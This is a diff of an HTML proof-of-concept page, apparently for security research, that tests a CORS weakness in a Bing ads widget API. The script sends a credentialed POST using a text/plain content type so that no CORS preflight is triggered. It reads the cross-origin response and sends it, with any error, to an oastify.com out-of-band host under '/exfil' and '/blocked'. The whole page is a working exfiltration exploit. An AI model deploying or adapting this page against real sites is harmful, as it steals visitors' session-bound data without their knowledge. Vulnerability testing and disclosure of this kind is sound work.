@@ -1,13 +1,27 @@
-<html>
-<h1>Hello</h1>
-
-   <script>
- fetch("https://www.bing.com/api/custom/ads/bingadswidget", {
+ <!doctype html>
+ <html><body>
+ <h1>CORS PoC</h1>
+ <pre id="out">running…</pre>
+ <script>
+ const OAST = "https://xijzy1c5xpfrpqee4eehdkz0brhi58tx.oastify.com";
+ const TARGET = "https://www.bing.com/api/custom/ads/bingadswidget";
+ 
+ fetch(TARGET, {
    method: "POST",
    credentials: "include",
-   headers: { "Content-Type": "application/json" },
-   body: JSON.stringify({ /* any minimal valid BingAdsWidgetRequest */ })
- }).then(r => r.text()).then(t => fetch("https://xijzy1c5xpfrpqee4eehdkz0brhi58tx.oastify.com/exfil?d=" + encodeURIComponent(t)));
+   headers: { "Content-Type": "text/plain" },   // ← key: text/plain is a CORS "simple" type, no preflight
+   body: "{}"
+ })
+ .then(r => r.text().then(t => ({ status: r.status, body: t })))
+ .then(res => {
+   document.getElementById("out").textContent =
+     "SUCCESS — JS read cross-origin response:\nstatus=" + res.status + "\nbody=" + res.body;
+   // exfil
+   return fetch(OAST + "/exfil?status=" + res.status + "&body=" + encodeURIComponent(res.body));
+ })
+ .catch(e => {
+   document.getElementById("out").textContent = "BLOCKED: " + e;
+   fetch(OAST + "/blocked?err=" + encodeURIComponent(String(e)));
+ });
  </script>
-  
-</html>
+ </body></html>
